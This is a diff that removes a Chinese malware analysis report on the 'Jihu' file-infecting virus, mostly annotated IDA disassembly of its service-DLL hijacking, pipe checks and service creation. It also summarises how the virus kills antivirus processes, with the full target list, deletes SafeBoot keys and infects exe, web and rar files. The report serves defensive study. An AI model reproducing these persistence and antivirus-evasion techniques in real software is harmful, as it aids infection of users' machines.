@@ -1,1209 +1,1993 @@
 
-
 # 极虎(虎虎生威)病毒分析报告
 
 > 原文：[`www.pediy.com/kssd/pediy11/108880.html`](https://www.pediy.com/kssd/pediy11/108880.html)
 
-附件中的病毒为隐藏文件，注意在虚拟机中调试  
-  
-分析的比较仓促，有一部分行为也没有仔细分析，请大家多多指教哈^\_^  
-  
-  
-一、概述  
-  
-本文档讲述关于极虎病毒变种的行为、技术细节；  
-  
-该病毒主要通过互联网和局域网传播，其大小为 248,832 字节 ，编写语言不详。运行后先判断自身模块位置，如为 0x0040000 则认为是 exe 文件，此时打开指定服务，搜索指定的 dll 文件，找到合适之后将自身修改成 dll 路径替换之。如果不为 0x0040000 则认定自身为 dll 文件然后破坏安全模式，结束杀毒软件，下载木马，感染指定类型的文件，感染可移动磁盘，攻击局域网用户。  
-  
-  
-二、行为预览  
-  
-1)  病毒名称：极虎病毒(又名虎虎生威)  
-2)  病毒类型：感染型病毒  
-3)  病毒大小：248,832 字节  
-4)  传播方式：互联网，局域网，可移动存储介质，网页挂马  
-5)  相关文件：  
-  
-a  【极虎病毒】分析报告.doc  :  病毒分析报告  
-b  极虎病毒 exe.v             :  病毒样本；  
-c  极虎病毒.idb              :  病毒 IDA 打开文件；      
-      
-6)  病毒具体行为：  
-  
-a  获取自身模块地址和 0x0040000 作比较，不同则判断成 exe 文件运行。此时将自身读入内存并修改成 dll 属性，然后查找指定的服务，找到其中停止的服务，并查找对应的 dll 用自身替换之。  
-  
-b  当为 dll 被加载时首先搜寻 avp.exe,bdagent.exe 进程，如果找到则写入一堆 nop 跳过之后将其删除。在临时文件夹下释放驱动文件加载后删除。获取自身模块对应的服务将其设置成开机启动。  
-  
-c  利用驱动干扰和结束杀毒软件，分别向驱动发送 IRP 吗添加劫持和结束杀软。其中被结束的杀软名有：KVMonXP.kxp.KVSrvXP.exe.avp.exe.avp.exe.avp.exe.RavMonD.exe.RavTask.exe.RsAgent.exe.rsnetsvr.exe.RsTray.exe.ScanFrm.exe.CCenter.exe.kavstart.exe.kissvc.exe.kpfw32.exe.kpfwsvc.exe.kswebshield.exe.kwatch.exe.kmailmon.exe.egui.exe.ekrn.exe.ccSvcHst.exe.ccSvcHst.exe.ccSvcHst.exe.Mcagent.exe.mcmscsvc.exe.McNASvc.exe.Mcods.exe.McProxy.exe.Mcshield.exe.mcsysmon.exe.mcvsshld.exe.MpfSrv.exe.McSACore.exe.msksrver.exe.sched.exe.avguard.exe.avmailc.exe.avwebgrd.exe.avgnt.exe.sched.exe.avguard.exe.avcenter.exe.UfSeAgnt.exe.TMBMSRV.exe.SfCtlCom.exe.TmProxy.exe.360SoftMgrSvc.exe.360tray.exe.qutmserv.exe.bdagent.exe.livesrv.exe.seccenter.exe.vsserv.exe.MPSVC.exe.MPSVC1.exe.MPSVC2.exe.MPMon.exe.ast.exe.360speedld.exe.360SoftMgrSvc.exe.360tray.exe.修复工具.exe.360hotfix.exe.360rpt.exe.360safe.exe.360safebox.exe.krnl360svc.exe.zhudongfangyu.exe.360sd.exe.360rp.exe.360se.exe.safeboxTray.exe.  
-  
-d  删除指定注册表 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal 和 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network 来破坏安全模式。修改 host 文件。感染文件，其中感染文件类型如下：exe，asp，aspx，asp，htm，html，rar。对 exe 文件主要是在添加一个.tc 节头，然后在末尾写上一串 shell 代码，对 rar 文件则首先解压到临时文件夹内，然后感染之再打包压回。其他文件则在末尾写上一串脚本。感染之前跳过系统路径包括 WinRAR，WindowsUpdate，Windows NT，Windows Media Player，Outlook Express，NetMeeting，MSN Gaming Zone，Movie Maker  
-microsoft frontpage，Messenger，Internet Explorer，InstallShield Installation InformationComPlus Applications，Common Files，RECYCLER，System Volume InformationDocuments and Settings，WinNT，WINDOWS。  
-  
-  
-三、清理方式  
-     由于该病毒破坏安全模式并感染电脑上大部分文件，手动很难清除，故建议采用专杀工具清理。  
-  
-  
-【以下为正文】  
-   
-  
-四、正文  
-  
-.text:00401B7E                 call    $+5  
-.text:00401B83                 mov  eax, \[esp+2Ch+var\_2C\] ;  取当前地址  
-.text:00401B86                 mov     \[ebp+lpAddress\], eax  
-.text:00401B89                 pop     eax  
-.text:00401B8A                 push    1Ch             ; size\_t  
-.text:00401B8C                 push    0               ; int  
-.text:00401B8E                 lea     eax, \[ebp+Buffer\]  
-.text:00401B91                 push    eax             ; void \*  
-.text:00401B92                 call    memset  
-.text:00401B97                 add     esp, 0Ch  
-.text:00401B9A                 push    1Ch             ; dwLength  
-.text:00401B9C                 lea     eax, \[ebp+Buffer\]  
-.text:00401B9F                 push    eax             ; lpBuffer  
-.text:00401BA0                 push    \[ebp+lpAddress\] ; lpAddress  
-.text:00401BA3                 call    ds:VirtualQuery  
-.text:00401BA9                 mov     eax, \[ebp+Buffer.AllocationBase\]  
-.text:00401BAC                 mov     hModule, eax  
-.text:00401BB1                 push    0               ; lpModuleName  
-.text:00401BB3                 call    ds:GetModuleHandleA  
-.text:00401BB9                 cmp     eax, hModule    ; 检查当前地址  
-.text:00401BBF                 jnz     short DllFile   ; 当是 Dll 文件时跳走  
-.text:00401BC1                 push    \[ebp+arg\_C\]  
-.text:00401BC4                 push    \[ebp+arg\_8\]  
-.text:00401BC7                 push    \[ebp+arg\_4\]  
-.text:00401BCA                 push    \[ebp+arg\_0\]  
-text:00401BCD                call   ExeRun .; 当该文件为 exe 执行  
-.text:00401BD2                 mov     \[ebp+var\_24\], eax  
-.text:00401BD5                 jmp     short loc\_401BE8  
-.text:00401BD7 DllFile:                              
-.text:00401BD7                 push    \[ebp+arg\_8\]  
-.text:00401BDA                 push    \[ebp+arg\_4\]  
-.text:00401BDD                 push    \[ebp+arg\_0\]  
-.text:00401BE0                 call    DllRun      . ; 当是 Dll 时执行  
-  
-当该文件为 exe 文件时首先创建管道\\\\\\\\.\\\\pipe\\\\96DBA249-E88E-4c47-98DC-E18E6E，如果成功就尝试从管道中读取数据，如果失败则通过判断错误码，如果是所有管道都在使用中则终止程序。实现过程如下：  
-.text:0040657E                 push    0               ; hTemplateFile  
-.text:00406580                 push    0    ; dwFlagsAndAttributes  
-.text:00406582                 push    3      ; dwCreationDisposition  
-.text:00406584                 push    0      ; lpSecurityAttributes  
-.text:00406586                 push    0               ; dwShareMode  
-.text:00406588                 push    0C0000000h      ; dwDesiredAccess  
-.text:0040658D                 push    \[ebp+lpFileName\] ; lpFileName  
-.text:00406590                 call    ds:CreateFileA  ; 尝试打开管道"\\\\.\\pipe\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A"  
-.text:00406596                 mov     \[ebp+hObject\], eax  
-.text:00406599                 cmp     \[ebp+hObject\], 0FFFFFFFFh  
-.text:0040659D                 jnz     short loc\_4065C7 ; 打开成功跳走  
-.text:0040659F                 push    1               ; Buffer  
-.text:004065A1                 lea     eax, \[ebp+String2\]  
-.text:004065A7                 push    eax             ; lpBuffer  
-.text:004065A8                 call    CreateBin       ; 打开成功，创建"C:\\\\DelInfo.bin"文件  
-.text:004065AD                 call    ds:GetLastError  
-.text:004065B3                 cmp     eax, 0E7h       ; 错误吗意义：所有的管道范例都在使用中。  
-.text:004065B8                 jnz     short Over\_0    ; 没有空闲的管道，跳出  
-.text:004065BA                 push    0               ; uExitCode  
-.text:004065BC                 call   ds:ExitProcess  ; 管道在使用终止程序  
-  
-当打开管道成功后跳到这里  
-\=============================================================  
-.text:004065C7                 mov     \[ebp+Mode\], 2   ; 管道模式  
-.text:004065CE                 push    0       ; lpCollectDataTimeout  
-.text:004065D0                 push    0        ; lpMaxCollectionCount  
-.text:004065D2                 lea     eax, \[ebp+Mode\] ; PIPE\_READMODE\_MESSAGE  
-.text:004065D5                 push    eax             ; lpMode  
-.text:004065D6                 push    \[ebp+hObject\]   ; hNamedPipe  
-.text:004065D9                 call    ds:SetNamedPipeHandleState ; 设置成读和阻塞模式  
-.text:004065DF                 push    0               ; lpOverlapped  
-.text:004065E1                 lea     eax, \[ebp+NumberOfBytesRead\]  
-.text:004065E4                 push    eax      ; lpNumberOfBytesWritten  
-.text:004065E5                 push    2         ; nNumberOfBytesToWrite  
-.text:004065E7                 push    offset byte\_40BE6C ; lpBuffer  
-.text:004065EC                 push    \[ebp+hObject\]   ; hFile  
-.text:004065EF                 call    ds:WriteFile    ; 将 DD 写入管道中  
-.text:004065F5                 push    0               ; lpOverlapped  
-.text:004065F7                 lea     eax, \[ebp+NumberOfBytesRead\]  
-.text:004065FA                 push    eax             ; lpNumberOfBytesRead  
-.text:004065FB                 push    104h            ; nNumberOfBytesToRead  
-.text:00406600                 push    offset String   ; lpBuffer  
-.text:00406605                 push    \[ebp+hObject\]   ; hFile  
-.text:00406608                 call    ds:ReadFile     ; 从管道中读取数据  
-.text:0040660E                 push    offset String   ; lpString  
-.text:00406613                 call    ds:lstrlenA  
-.text:00406619                 test    eax, eax  
-.text:0040661B                 jnz     short ReadSucceed ; 从该管道读取数据成功  
-.text:0040661D                 push    \[ebp+hObject\]   ; hObject  
-.text:00406620                 call    ds:CloseHandle  
-.text:00406626                 push    1               ; Buffer  
-.text:00406628                 lea     eax, \[ebp+String2\]  
-.text:0040662E                 push    eax             ; lpBuffer  
-.text:0040662F                 call    CreateBin  
-.text:00406634                 push    0               ; uExitCode  
-.text:00406636                 call    ds:ExitProcess  ; 管道读取数据失败终止程序  
-  
-在管道中读取数据成功后则通过 strrchr 函数搜索以 2E 开头的 ASCII 吗字符串，之后反复打开上面管道，知道找不到文件为止，实现方法如下：  
-.text:0040666C Next:                                   ; CODE XREF:   
-.text:0040666C                 mov     eax, \[ebp+var\_26C\]  
-.text:00406672                 inc     eax  
-.text:00406673                 mov     \[ebp+var\_26C\], eax  
-.text:00406679 loc\_406679:                 
-.text:00406679                 cmp     \[ebp+var\_26C\], 64h  
-.text:00406680                 jge     short Over\_1  
-.text:00406682                 push    0          ; hTemplateFile  
-.text:00406684                 push    0         ; dwFlagsAndAttributes  
-.text:00406686                 push    3         ; dwCreationDisposition  
-.text:00406688                 push    0          ; lpSecurityAttributes  
-.text:0040668A                 push    0            ; dwShareMode  
-.text:0040668C                 push    0C0000000h      ; dwDesiredAccess  
-.text:00406691                 push    \[ebp+lpFileName\] ; lpFileName  
-.text:00406694                 call    ds:CreateFileA  ; 尝试打开"\\\\.\\pipe\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A"  
-.text:0040669A                 mov     \[ebp+hObject\], eax  
-.text:0040669D                 cmp     \[ebp+hObject\], 0FFFFFFFFh  
-.text:004066A1                 jnz     short OpenPipeFail  
-.text:004066A3                 call    ds:GetLastError  
-.text:004066A9                 cmp     eax, 2         ; 错误码：系统找不到指定文件  
-.text:004066AC                 jnz     short Next\_1  
-.text:004066AE                 jmp     short Over\_1    ; 反复打开管道，知道找不到文件后推出  
-.text:004066B0 Next\_1:                
-.text:004066B0                 jmp     short GetNext  
-.text:004066B2 OpenPipeFail:                   
-.text:004066B2                 push    \[ebp+hObject\]   ; hObject  
-.text:004066B5                 call    ds:CloseHandle  
-.text:004066BB GetNext:                    
-.text:004066BB                 push    32h             ; dwMilliseconds  
-.text:004066BD                 call    ds:Sleep        ; 睡眠 32h 毫秒  
-.text:004066C3                 jmp     short Next  
-然后获取自身文件名完整路径，申请一块堆内存将自身读入内存并修改成 dll 属性，实现方法如下：  
-.text:00401C0B                 push    104h            ; nSize  
-.text:00401C10                 lea     eax, \[ebp+FileName\]  
-.text:00401C16                 push    eax             ; lpFilename  
-.text:00401C17                 push    \[ebp+hModule\]   ; hModule  
-.text:00401C1A                 call    ds:GetModuleFileNameA  
-.text:00401C20                 and     \[ebp+var\_120\], 0  
-.text:00401C27                 jmp     short loc\_401C36  
-.text:00401C29 loc\_401C29:                     
-.text:00401C29                 mov     eax, \[ebp+var\_120\]  
-.text:00401C2F                 inc     eax  
-.text:00401C30                 mov     \[ebp+var\_120\], eax  
-.text:00401C36 loc\_401C36:          
-.text:00401C36                 cmp     \[ebp+var\_120\], 32h  
-.text:00401C3D                 jge     short loc\_401C70  
-.text:00401C3F                 push    0               ; hTemplateFile  
-.text:00401C41                 push    0       ; dwFlagsAndAttributes  
-.text:00401C43                 push    3     ; dwCreationDisposition  
-.text:00401C45                 push    0         ; lpSecurityAttributes  
-.text:00401C47                 push    1               ; dwShareMode  
-.text:00401C49                 push    80000000h       ; dwDesiredAccess  
-.text:00401C4E                 lea     eax, \[ebp+FileName\] ; 自身文件路径  
-.text:00401C54                 push    eax             ; lpFileName  
-.text:00401C55                 call    ds:CreateFileA  ; 创建打开自身的文件句柄  
-.text:00401C5B                 mov     \[ebp+hObject\], eax  
-.text:00401C5E                 cmp     \[ebp+hObject\], 0FFFFFFFFh  
-.text:00401C62                 jz      short loc\_401C66 ; 打开失败跳走  
-.text:00401C64                 jmp     short loc\_401C70  
-.text:00401C66 loc\_401C66:           
-.text:00401C66                 push    64h             ; dwMilliseconds  
-.text:00401C68                 call    ds:Sleep  
-.text:00401C6E                 jmp     short loc\_401C29 ; 跳回接着读取自身  
-.text:00401C70 loc\_401C70:                 
-.text:00401C70                 push    0               ; lpFileSizeHigh  
-.text:00401C72                 push    \[ebp+hObject\]   ; hFile  
-.text:00401C75                 call    ds:GetFileSize ; 打开成功跳到这里获得文件长度  
-.text:00401C7B                 mov     \[ebp+nNumberOfBytesToRead\], eax  
-.text:00401C7E                 cmp     \[ebp+nNumberOfBytesToRead\], 0  
-.text:00401C82                 jz    short loc\_401C8A ; 文件长度为 0 跳走关闭句柄退出  
-.text:00401C84                 cmp     \[ebp+nNumberOfBytesToRead\], 0FFFFFFFFh  
-.text:00401C88                 jnz  short loc\_401CA6 ; 文件长度合适，跳走准备内存读取  
-.text:00401C8A loc\_401C8A:             
-.text:00401C8A                 push    \[ebp+hObject\]   ; hObject  
-.text:00401C8D                 call    ds:CloseHandle  
-.text:00401C93                 mov     eax, \[ebp+arg\_4\]  
-.text:00401C96                 and     dword ptr \[eax\], 0  
-.text:00401C99                 mov     eax, \[ebp+arg\_8\]  
-.text:00401C9C                 and     dword ptr \[eax\], 0  
-.text:00401C9F                 xor     eax, eax  
-.text:00401CA1                 jmp     locret\_401D57  
-.text:00401CA6 loc\_401CA6:   
-.text:00401CA6                 mov     eax, \[ebp+arg\_8\]  
-.text:00401CA9                 mov     ecx, \[ebp+nNumberOfBytesToRead\]  
-.text:00401CAC                 mov     \[eax\], ecx  
-.text:00401CAE                 mov     eax, \[ebp+nNumberOfBytesToRead\]  
-.text:00401CB1                 add     eax, 20h  
-.text:00401CB4                 push    eax             ; unsigned int  
-.text:00401CB5                 call    ??2@YAPAXI@Z    ; operator new(uint)  
-.text:00401CBA                 pop     ecx  
-.text:00401CBB                 mov     \[ebp+var\_124\], eax  
-.text:00401CC1                 mov     eax, \[ebp+var\_124\]  
-.text:00401CC7                 mov     \[ebp+lpBuffer\], eax  
-.text:00401CCD                 mov     eax, \[ebp+arg\_4\]  
-.text:00401CD0                 mov     ecx, \[ebp+lpBuffer\]  
-.text:00401CD6                 mov     \[eax\], ecx  
-.text:00401CD8                 mov     eax, \[ebp+nNumberOfBytesToRead\]  
-.text:00401CDB                 add     eax, 20h  
-.text:00401CDE                 push    eax             ; size\_t  
-.text:00401CDF                 push    0               ; int  
-.text:00401CE1                 push    \[ebp+lpBuffer\]  ; void \*  
-.text:00401CE7                 call    memset          ; 将申请的内存区域清 0  
-.text:00401CEC                 add     esp, 0Ch  
-.text:00401CEF                 push    0               ; lpOverlapped  
-.text:00401CF1                 lea     eax, \[ebp+NumberOfBytesRead\]  
-.text:00401CF4                 push    eax             ; lpNumberOfBytesRead  
-.text:00401CF5                 push    \[ebp+nNumberOfBytesToRead\] ; nNumberOfBytesToRead  
-.text:00401CF8                 push    \[ebp+lpBuffer\]  ; lpBuffer  
-.text:00401CFE                 push    \[ebp+hObject\]   ; hFile  
-.text:00401D01                 call    ds:ReadFile     ; 读取自身到指定的内存中  
-.text:00401D07                 push    \[ebp+hObject\]   ; hObject  
-.text:00401D0A                 call    ds:CloseHandle  
-.text:00401D10                 and     \[ebp+var\_10\], 0  
-.text:00401D14                 mov     eax, \[ebp+lpBuffer\]  
-.text:00401D1A                 mov     ecx, \[ebp+lpBuffer\]  
-.text:00401D20                 add     ecx, \[eax+3Ch\]  ; 取该文件 DOS 头的最后一个成员变量，使 ecx 定位到 NT 头  
-.text:00401D23                 mov     \[ebp+var\_10\], ecx  
-.text:00401D26                 cmp     \[ebp+hModule\], 0  
-.text:00401D2A                 jz      short loc\_401D41 ; 这里是 0 代表读取自身  
-.text:00401D2C                 mov     eax, \[ebp+var\_10\]  
-.text:00401D2F                 movzx   eax, word ptr \[eax+16h\]  
-.text:00401D33                 and     eax, 0DFFFh     .; 修改自身成 dll 属性  
-  
-获取临时文件夹路径和系统 windows 路径，在"sfc\_os.dll"中搜索序号为 5 的函数，如果该 dll 装载失败则跳走从注册表中读取数据，打开设备管理器循环查看服务，当服务属于停止状态则替换该服务对应的 Dll，替换的文件是 Dll 属性的自身文件，之后跳走退出，不成功则跳回查询下一个。  
-.text:004020AE                 push    104h            ; uSize  
-.text:004020B3                 lea     eax, \[ebp+Buffer\]  
-.text:004020B9                 push    eax             ; lpBuffer  
-.text:004020BA                 call    ds:GetWindowsDirectoryA ; 获取 windows 系统目录  
-.text:004020C0                 push    104h            ; size\_t  
-.text:004020C5                 push    0               ; int  
-.text:004020C7                 lea     eax, \[ebp+TempPath\]  
-.text:004020CD                 push    eax             ; void \*  
-.text:004020CE                 call    memset  
-.text:004020D3                 add     esp, 0Ch  
-.text:004020D6                 lea     eax, \[ebp+TempPath\]  
-.text:004020DC                 push    eax             ; lpBuffer  
-.text:004020DD                 push    104h            ; nBufferLength  
-.text:004020E2                 call    ds:GetTempPathA ; 获取临时文件夹路径  
-.text:004020E8                 push    0F003Fh         ; dwDesiredAccess  
-.text:004020ED                 push    0               ; lpDatabaseName  
-.text:004020EF                 push    0               ; lpMachineName  
-.text:004020F1                 call    ds:OpenSCManagerA ; 打开设备管理器  
-.text:004020F7                 mov     \[ebp+hSCManager\], eax  
-.text:004020FA                 push    offset LibFileName ; "sfc\_os.dll"  
-.text:004020FF                 call    ds:LoadLibraryA  
-.text:00402105                 mov     \[ebp+hLibModule\], eax  
-.text:0040210B                 cmp     \[ebp+hLibModule\], 0  
-.text:00402112                 jnz     short GetFunAddNo5 ; Dll 装载成功跳走  
-.text:00402114                 jmp     GetVauleReg  
-.text:00402119                 jmp     GetVauleReg  
-.text:0040211E GetFunAddNo5:            
-.text:0040211E                 push    5               ; lpProcName  
-.text:00402120                 push    \[ebp+hLibModule\] ; hModule  
-.text:00402126                 call    ds:GetProcAddress ; 取得序号为 5 的函数地址  
-.text:0040212C                 mov     FunNO5sfc\_os, eax  
-  
-text:00402141 NextService:                  
-.text:00402141                 mov     eax, \[ebp+var\_B8C\]  
-.text:00402147                 inc     eax  
-.text:00402148                 mov     \[ebp+var\_B8C\], eax  
-.text:0040214E loc\_40214E:                          
-.text:0040214E                 push    \[ebp+var\_B8C\]   ; int  
-.text:00402154                 push    0               ; int  
-.text:00402156                 push    40h             ; int  
-.text:00402158                 lea     eax, \[ebp+ServiceName\]  
-.text:0040215E                 push    eax             ; lpString1  
-.text:0040215F                 call    sub\_401879      ; 解压服务名称  
-.text:00402164                 cmp     eax, 0FFFFFFFFh  
-.text:00402167                 jnz     short loc\_40218A  
-.text:00402169                 cmp     \[ebp+var\_784\], 0  
-.text:00402170                 jnz     short loc\_402185 ; ; Dll 装载失败跳走  
-.text:00402172                 mov     \[ebp+var\_784\], 1  
-.text:0040217C                 or      \[ebp+var\_B8C\], 0FFFFFFFFh  
-.text:00402183                 jmp     short NextService  
-.text:00402185 loc\_402185:                     
-.text:00402185                 jmp     GetVauleReg     ; ; Dll 装载失败跳走  
-.text:0040218A loc\_40218A:                       
-.text:0040218A                 push    \[ebp+var\_B8C\]   ; int  
-.text:00402190                 push    1               ; int  
-.text:00402192                 push    40h             ; int  
-.text:00402194                 lea     eax, \[ebp+String1\]  
-.text:0040219A                 push    eax             ; lpString1  
-.text:0040219B                 call    sub\_401879  
-.text:004021A0                 push    offset String   ; lpString2  
-.text:004021A5                 lea     eax, \[ebp+String1\]  
-.text:004021AB                 push    eax             ; lpString1  
-.text:004021AC                 call    ds:lstrcmpiA  
-.text:004021B2                 test    eax, eax  
-.text:004021B4                 jnz     short loc\_4021B8  
-.text:004021B6                 jmp     short NextService  
-.text:004021B8 loc\_4021B8:                   
-.text:004021B8                 push    0F01FFh         ; dwDesiredAccess  
-.text:004021BD                 lea     eax, \[ebp+ServiceName\]  
-.text:004021C3                 push    eax             ; lpServiceName  
-.text:004021C4                 push    \[ebp+hSCManager\] ; hSCManager  
-.text:004021C7                 call    ds:OpenServiceA  
-.text:004021CD                 mov     \[ebp+hSCObject\], eax  
-.text:004021D3                 cmp     \[ebp+hSCObject\], 0  
-.text:004021DA                 jnz     short OpenSucceed ; 打开服务成功跳走  
-.text:004021DC                 jmp     NextService  
-.text:004021E1 OpenSucceed:               
-.text:004021E1                 push    1Ch             ; size\_t  
-.text:004021E3                 push    0               ; int  
-.text:004021E5                 lea     eax, \[ebp+ServiceStatus\]  
-.text:004021EB                 push    eax             ; void \*  
-.text:004021EC                 call    memset  
-.text:004021F1                 add     esp, 0Ch  
-.text:004021F4                 lea     eax, \[ebp+ServiceStatus\]  
-.text:004021FA                 push    eax             ; lpServiceStatus  
-.text:004021FB                 push    \[ebp+hSCObject\] ; hService  
-.text:00402201                 call    ds:QueryServiceStatus   ;查看服务状态  
-.text:00402207                 cmp     \[ebp+ServiceStatus.dwCurrentState\], 1   
-; SERVICE\_STOPPED  
-.text:0040220E                 jz      short ReplaceDll ; 查看服务停止，跳走  
-.text:00402210                 cmp     \[ebp+var\_784\], 0  
-.text:00402217                 jnz     short ControlThisService  
-.text:00402219                 jmp    CloseThisNext   ; 跳走关闭该服务并取下一个值  
-.text:00402223 ControlThisService:              
-.text:00402223                 lea     eax, \[ebp+ServiceStatus\]  
-.text:00402229                 push    eax             ; lpServiceStatus  
-.text:0040222A                 push    1               ; dwControl  
-.text:0040222C                 push    \[ebp+hSCObject\] ; hService  
-.text:00402232                 call    ds:ControlService ; 服务没停止则将其停止  
-.text:00402238                 test    eax, eax  
-.text:0040223A                 jnz     short ReplaceDll ; 当服务停止跳走  
-.text:0040223C                 jmp    CloseThisNext   ; 跳走关闭该服务并取下一个值  
-.text:00402246 ReplaceDll:                          
-.text:00402246                 push    104h            ; size\_t  
-.text:0040224B                 push    0               ; int  
-.text:0040224D                 lea     eax, \[ebp+FileName\]  
-.text:00402253                 push    eax             ; void \*  
-.text:00402254                 call    memset  
-.text:00402259                 add     esp, 0Ch  
-.text:0040225C                 lea     eax, \[ebp+String1\]  
-.text:00402262                 push    eax  
-.text:00402263                 lea     eax, \[ebp+Buffer\]  
-.text:00402269                 push    eax  
-.text:0040226A                 push offset aSSystem32S\_dll ; "%s\\\\system32\\\\%s.dll"  
-.text:0040226F                 lea     eax, \[ebp+FileName\]  
-.text:00402275                 push    eax             ; LPSTR  
-.text:00402276                 call    ds:wsprintfA    ; 设置 dll 路径，本次调试值为"C:\\WINDOWS\\system32\\appmgmts.dll"  
-.text:0040227C                 add     esp, 10h  
-.text:0040227F                 lea     eax, \[ebp+FileName\]  
-.text:00402285                 push    eax             ; lpFileName  
-.text:00402286                 call    ReplaceDll     ; 替换 dll 并将其创建时间设置成原来创建的时间                                    
- ; 本次调试值为"C:\\WINDOWS\\system32\\appmgmts.dll"  
-.text:0040228B                 test    eax, eax  
-.text:0040228D                 jnz     short GoStarService  
-.text:00402291                 jmp  short CloseThisNext ; 跳走关闭该服务并取下一个值  
-.text:00402293 GoStarService:               
-.text:00402293                 push    0      ; lpServiceArgVectors  
-.text:00402295                 push    0        ; dwNumServiceArgs  
-.text:00402297                 push    \[ebp+hSCObject\] ; hService  
-.text:0040229D                 call    ds:StartServiceA ; 开启原来关闭的服务  
-.text:004022A3                 test    eax, eax  
-.text:004022A5                 jnz     short ServiceOver ; 重启服务成功跳走  
-.text:004022A7                 jmp short CloseThisNext ; 跳走关闭该服务并取下一个值  
-.text:004022A9                 jmp short CloseThisNext ; 跳走关闭该服务并取下一个值  
-.text:004022AB ServiceOver:              
-.text:004022AB                 push    \[ebp+hLibModule\] ; hLibModule  
-.text:004022B1                 call    ds:FreeLibrary  
-.text:004022B7                 push    \[ebp+hSCObject\] ; hSCObject  
-.text:004022BD                 call    ds:CloseServiceHandle  
-.text:004022C3                 push    \[ebp+hSCManager\] ; hSCObject  
-.text:004022C6                 call    ds:CloseServiceHandle  
-.text:004022CC                 cmp     dword\_40DC3C, 0  
-.text:004022D3                 jz      short ExitThisProcess ; 替换结束服务重启成功跳走终止程序  
-.text:004022D5                 mov     eax, dword\_40DC3C  
-.text:004022DA                 mov     \[ebp+var\_C30\], eax  
-.text:004022E0                 push    \[ebp+var\_C30\]   ; void \*  
-.text:004022E6                 call  ??3@YAXPAX@Z ; operator delete(void \*)  
-.text:004022EB                 pop     ecx  
-.text:004022EC ExitThisProcess:                         
-.text:004022EC                 push    0               ; uExitCode  
-.text:004022EE                 call    ds:ExitProcess  
-.text:004022F4 CloseThisNext:                    
-.text:004022F4                 push    \[ebp+hSCObject\] ; hSCObject  
-.text:004022FA                 call    ds:CloseServiceHandle  
-.text:00402300                 jmp     NextService     ; 跳回取下一个值  
-  
-  
-当数据解压失败或者装载 Dll 失败则从注册表读取数据  
-.text:00402305 GetVauleReg:                                         ;   
-.text:00402305                 push    400h            ; size\_t  
-.text:0040230A                 push    0               ; int  
-.text:0040230C                 lea     eax, \[ebp+Data\]  
-.text:00402312                 push    eax             ; void \*  
-.text:00402313                 call    memset  
-.text:00402318                 add     esp, 0Ch  
-.text:0040231B                 mov     \[ebp+cbData\], 400h  
-.text:00402322                 lea     eax, \[ebp+hKey\]  
-.text:00402325                 push    eax             ; phkResult  
-.text:00402326                 push    1               ; samDesired  
-.text:00402328                 push    0               ; ulOptions  
-.text:0040232A                 push    offset aSoftwareMicros ; "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVe"...  
-.text:0040232F                 push    80000002h       ; hKey  
-.text:00402334                 call    ds:RegOpenKeyExA  
-.text:0040233A                 mov   dword ptr \[ebp+ValueName\], 7374656Eh  
-.text:00402344                 mov     \[ebp+var\_77C\], 736376h  
-.text:0040234E                 lea     eax, \[ebp+cbData\]  
-.text:00402351                 push    eax             ; lpcbData  
-.text:00402352                 lea     eax, \[ebp+Data\]  
-.text:00402358                 push    eax             ; lpData  
-.text:00402359                 lea     eax, \[ebp+Type\]  
-.text:0040235F                 push    eax             ; lpType  
-.text:00402360                 push    0               ; lpReserved  
-.text:00402362                 lea     eax, \[ebp+ValueName\]  
-.text:00402368                 push    eax             ; lpValueName  
-.text:00402369                 push    \[ebp+hKey\]      ; hKey  
-.text:0040236C                 call ds:RegQueryValueExA ; 从注册表中读取数据  
-.text:00402372                 push    \[ebp+hKey\]      ; hKey  
-.text:00402375                 call    ds:RegCloseKey  
-.text:0040237B                 lea     eax, \[ebp+Data\]  
-.text:00402381                 mov   \[ebp+lpString\], eax ; 从注册表中读取的数据首地址  
-.text:00402384 GetNext\_1:                             
-.text:00402384                 mov     eax, \[ebp+lpString\]  
-.text:00402387                 movsx   eax, byte ptr \[eax\]  
-.text:0040238A                 test    eax, eax  
-.text:0040238C                 jz   over\_1 ; 如果从注册表中读取的数据为 0 则跳走退出  
-.text:00402392                 push    offset String   ; lpString2  
-.text:00402397                 push    \[ebp+lpString\]  ; lpString1  
-.text:0040239A                 call    ds:lstrcmpiA  
-.text:004023A0                 test    eax, eax  
-.text:004023A2                 jnz     short loc\_4023A6  
-.text:004023A4                 jmp     short GetNext\_1  
-.text:004023A6 loc\_4023A6:                  
-.text:004023A6                 push    400h            ; size\_t  
-.text:004023AB                 push    0               ; int  
-.text:004023AD                 lea     eax, \[ebp+BinaryPathName\]  
-.text:004023B3                 push    eax             ; void \*  
-.text:004023B4                 call    memset  
-.text:004023B9                 add     esp, 0Ch  
-.text:004023BC                 push    offset aVcs     ; "vcs"  
-.text:004023C1                 push    offset aOst\_exe ; "ost.exe"  
-.text:004023C6                 push    offset aSystemrootSyst  
- ; "%SystemRoot%\\\\System32\\\\svch%s -k nets"  
-.text:004023CB                 push    offset aSS\_0    ; "%s%s"  
-.text:004023D0                 lea     eax, \[ebp+BinaryPathName\]  
-.text:004023D6                 push    eax             ; LPSTR  
-.text:004023D7                 call    ds:wsprintfA    ; "%SystemRoot%\\\\System32\\\\svchost.exe -k nets"  
-.text:004023DD                 add     esp, 14h  
-.text:004023E0                 push    0               ; lpPassword  
-.text:004023E2                 push    0   ; lpServiceStartName  
-.text:004023E4                 push    0               ; lpDependencies  
-.text:004023E6                 push    0               ; lpdwTagId  
-.text:004023E8                 push    0       ; lpLoadOrderGroup  
-.text:004023EA                 lea     eax, \[ebp+BinaryPathName\] ; "%SystemRoot%\\\\System32\\\\svchost.exe -k nets"  
-.text:004023F0                 push    eax             ; lpBinaryPathName  
-.text:004023F1                 push    1               ; dwErrorControl  
-.text:004023F3                 push    2               ; dwStartType  
-.text:004023F5                 push    20h             ; dwServiceType  
-.text:004023F7                 push    10h             ; dwDesiredAccess  
-.text:004023F9                 push    \[ebp+lpString\]  ; lpDisplayName  
-.text:004023FC                 push    \[ebp+lpString\]  ; lpServiceName  
-.text:004023FF                 push    \[ebp+hSCManager\] ; hSCManager  
-.text:00402402                 call    ds:CreateServiceA  
-.text:00402408                 mov     \[ebp+hSCObject\], eax  
-.text:0040240E                 cmp     \[ebp+hSCObject\], 0  
